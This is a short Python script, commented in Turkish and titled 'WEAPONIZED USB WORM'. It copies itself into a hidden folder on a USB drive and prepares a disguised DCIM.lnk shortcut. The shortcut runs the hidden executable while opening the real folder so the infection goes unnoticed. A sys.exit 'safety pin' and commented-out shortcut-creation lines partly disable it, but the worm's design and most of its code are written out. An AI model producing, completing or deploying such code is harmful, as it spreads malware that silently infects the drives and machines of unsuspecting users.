import os
import sys
import shutil
# import win32com.client (Kısayol oluşturmak için)

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod USB sürücülere kendini kopyalar ve gizler.")

print("--- WEAPONIZED USB WORM ---")

def infect_usb(drive_letter):
    virus_source = sys.argv[0]
    hidden_folder = os.path.join(drive_letter, "Systemdata")
    
    # 1. VİRÜSÜ GİZLE
    if not os.path.exists(hidden_folder):
        os.makedirs(hidden_folder)
        # Klasörü gizli yap (+h)
        os.system(f"attrib +h {hidden_folder}")
        
    shutil.copy(virus_source, os.path.join(hidden_folder, "data.exe"))
    
    # 2. LNK TUZAĞI (Weaponized Part)
    # Simülasyon: Sadece kopyala.
    # Gerçek: Orijinal klasörlerin yerine, klasör görünümlü kısayollar koy.
    
    # Hedef: USB'deki 'DCIM' (Fotoğraf) klasörü gibi görünen kısayol.
    shortcut_path = os.path.join(drive_letter, "DCIM.lnk")
    
    # Bu komut hem virüsü çalıştırır, hem de gerçek klasörü açar (Fark edilmesin diye)
    target_cmd = f"cmd.exe /c start {os.path.join(hidden_folder, 'data.exe')} & start explorer {os.path.join(drive_letter, 'Real_DCIM')}"
    
    print(f"[*] Tuzak kısayol oluşturuluyor: {shortcut_path}")
    # shell = win32com.client.Dispatch("WScript.Shell")
    # shortcut = shell.CreateShortcut(shortcut_path)
    # shortcut.TargetPath = target_cmd
    # shortcut.IconLocation = "shell32.dll, 3" # Klasör Simgesi
    # shortcut.Save()
    
    print("💀 USB ENFEKTE EDİLDİ.")

if __name__ == "__main__":
    infect_usb("E:\\")